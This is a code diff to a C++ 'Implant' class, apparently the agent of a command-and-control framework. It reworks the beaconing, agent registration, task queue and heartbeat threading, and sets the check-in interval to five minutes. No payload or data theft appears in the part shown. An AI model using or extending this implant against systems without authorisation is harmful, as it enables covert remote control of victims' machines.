@@ -21,6 +21,10 @@ Implant::Implant(std::string server_host, std::string server_port, std::string a
 {
 }
 
+Implant::~Implant() {
+    context.stop();
+}
+
 void Implant::beacon() {
     if (isRunning) {
         asio::error_code ec;
@@ -28,21 +32,19 @@ void Implant::beacon() {
         asio::ip::tcp::socket socket(context); 
         asio::streambuf buf;
 
-        std::deque<std::string> receive_queue;
-        std::deque<std::string> send_queue;
+        std::thread t;
 
         socket.async_connect(endpoint, [&](const asio::error_code& error) {
             if (!error) {
                 std::cout << "Connected to the server!" << std::endl;
                 
                 // Listen for messages, need to have equivalent to .then(), maybe just add callback to add to receive queue
-                msg::receiveResponse(socket, buf, receive_queue);
+                msg::receiveResponse(socket, buf, taskQueue);
 
                 registerAgent(socket);
 
-                std::thread heartbeatThread(&Implant::heartbeat, this, std::ref(socket));
-                heartbeatThread.detach();
-                    
+                t = std::thread(&Implant::heartbeat, this, std::ref(socket));
+                
             } else {
                 // Check for specific errors
                 if (error == asio::error::connection_refused) {
@@ -54,13 +56,9 @@ void Implant::beacon() {
         });
 
         context.run();
-    }
-}
-
-void handleResponse(std::deque<std::string>& response_queue) {
-    while (!response_queue.empty()) {
-        std::cout << response_queue.front() << std::endl;
-        response_queue.pop_front();
+        if (t.joinable()) {
+            t.join();
+        }
     }
 }
 
@@ -71,15 +69,13 @@ void Implant::registerAgent(asio::ip::tcp::socket& socket) {
 }
 
 // TODO: make into own thread or process
-void Implant::heartbeat(asio::ip::tcp::socket& socket) { 
-    while (true) {
+void Implant::heartbeat(asio::ip::tcp::socket& socket) {
+    while (isRunning) {
         PingTask ping(id);
         msg::Request pingResult = ping.run();
         msg::sendRequest(socket, pingResult);
-
-        // Wait for 5 minutes before the next heartbeat
-        std::this_thread::sleep_for(std::chrono::minutes(1));
-    } 
+        std::this_thread::sleep_for(std::chrono::minutes(5));
+    }
 }
 
 void Implant::setRunning(bool running) { isRunning = running; }
